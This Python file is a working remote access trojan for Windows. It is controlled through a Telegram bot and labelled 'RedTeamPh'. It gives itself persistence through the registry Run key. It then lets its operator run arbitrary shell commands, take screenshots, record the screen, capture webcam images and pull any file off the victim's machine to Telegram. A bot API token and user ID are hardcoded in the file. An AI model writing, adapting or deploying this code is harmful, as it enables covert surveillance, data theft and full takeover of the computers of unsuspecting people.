import os
import telebot
import pyautogui
import cv2
import subprocess
import time
import sys
import platform
import winreg as reg
import io
import numpy as np

# Your Telegram bot API key and user ID
BOT_API_KEY = "8153432169:AAEFNNlq8KygwNSjrpZslXKbTTkmYgIryEg"  # Replace with your actual bot API key
telegram_user_id = 728400174  # Replace with your actual Telegram user ID

bot = telebot.TeleBot(BOT_API_KEY)

# Verify commands are coming from the registered Telegram user
def verify_telegram_id(id):
    return telegram_user_id == id

# Add the script to startup in Windows (persistence)
def add_to_registry():
    if platform.system() != "Windows":
        return
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_value = "RedTeamPh"
    reg_data = f'"{sys.executable}" "{os.path.realpath(__file__)}"'  # Use quotes for safety

    try:
        registry = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry, reg_value, 0, reg.REG_SZ, reg_data)
        reg.CloseKey(registry)
    except Exception as e:
        print(f"Error adding to registry: {e}")

# Ensure the script starts with persistence (only run once)
add_to_registry()

# Handle /start command
@bot.message_handler(commands=['start'])
def start_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        # Get the username using 'whoami' and PC name using 'platform.node'
        username = subprocess.getoutput("whoami")
        pc_name = platform.node()  # Get the PC name
        
        # Send a connection confirmation message
        confirmation_message = f"[+] {username} ({pc_name}) is connected"
        bot.reply_to(message, confirmation_message)
    except Exception as e:
        bot.reply_to(message, f"Error during initialization: {e}")

# Handle /cd command
@bot.message_handler(commands=['cd'])
def handle_cd(message):
    if not verify_telegram_id(message.from_user.id):
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /cd <path_to_directory>")
        return

    directory = command_parts[1]
    try:
        os.chdir(directory)
        bot.reply_to(message, f"Changed directory to: {os.getcwd()}")
    except Exception as e:
        bot.reply_to(message, f"[!] Error: {str(e)}")

# Handle /dir command (list contents of current directory)
@bot.message_handler(commands=['dir'])
def list_directory(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        files = os.listdir(os.getcwd())
        response = "\n".join(files)
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"[!] Error: {str(e)}")

# Handle /exec command (execute commands)
@bot.message_handler(commands=['exec'])
def execute_command(message):
    if not verify_telegram_id(message.from_user.id):
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /exec <command>")
        return

    command = command_parts[1]
    output = subprocess.getoutput(command)
    bot.reply_to(message, output[:4096])  # Send only up to 4096 characters

# Handle /screenshot command
@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    if not verify_telegram_id(message.from_user.id):
        return

    try:
        screenshot = pyautogui.screenshot()

        # Create an in-memory file
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)  # Reset the stream pointer

        # Send the screenshot to the Telegram user
        bot.send_photo(message.from_user.id, img_bytes)
        
        bot.reply_to(message, "[+] Screenshot taken successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Error taking screenshot: {e}")

# Handle /recordscreen command
@bot.message_handler(commands=['recordscreen'])
def record_screen(message):
    if not verify_telegram_id(message.from_user.id):
        return

    try:
        duration = 10  # Duration in seconds
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('output.avi', fourcc, 20.0, screen_size)

        start_time = time.time()

        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()

        # Send the video to Telegram
        with open("output.avi", "rb") as video:
            bot.send_video(message.from_user.id, video)
        os.remove("output.avi")

        bot.reply_to(message, "[+] Screen recording completed successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Error recording screen: {e}")

# Handle /webcam command (capture an image from webcam)
@bot.message_handler(commands=['webcam'])
def capture_webcam(message):
    if not verify_telegram_id(message.from_user.id):
        return

    try:
        # Open the webcam
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            bot.reply_to(message, "[!] Error: Unable to access the webcam.")
            return

        # Save the image to a buffer
        img_bytes = io.BytesIO()
        _, img_encoded = cv2.imencode('.jpg', frame)
        img_bytes.write(img_encoded)
        img_bytes.seek(0)

        # Send the image to Telegram
        bot.send_photo(message.from_user.id, img_bytes)
        bot.reply_to(message, "[+] Webcam image captured successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Error capturing webcam image: {e}")

# Handle /getfile command (retrieve and send a file)
@bot.message_handler(commands=['getfile'])
def get_file(message):
    if not verify_telegram_id(message.from_user.id):
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /getfile <file_path>")
        return

    file_path = command_parts[1]

    try:
        # Check if file exists
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                bot.send_document(message.from_user.id, file)
            bot.reply_to(message, f"[+] File '{file_path}' sent successfully.")
        else:
            bot.reply_to(message, f"[!] Error: File '{file_path}' not found.")
    except Exception as e:
        bot.reply_to(message, f"[!] Error sending file: {e}")

# Handle /help command (list available commands)
@bot.message_handler(commands=['help'])
def help_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    help_text = """
    Available commands:
    /start - Start the bot and check connection
    /cd <path> - Change directory
    /dir - List files in the current directory
    /exec <command> - Execute a system command
    /screenshot - Take a screenshot and send it
    /recordscreen - Record screen and send it
    /getfile <file_path> - Get a file by specifying its path
    /webcam - Capture an image from the webcam and send it
    """
    bot.reply_to(message, help_text)

# Start the bot
bot.infinity_polling()
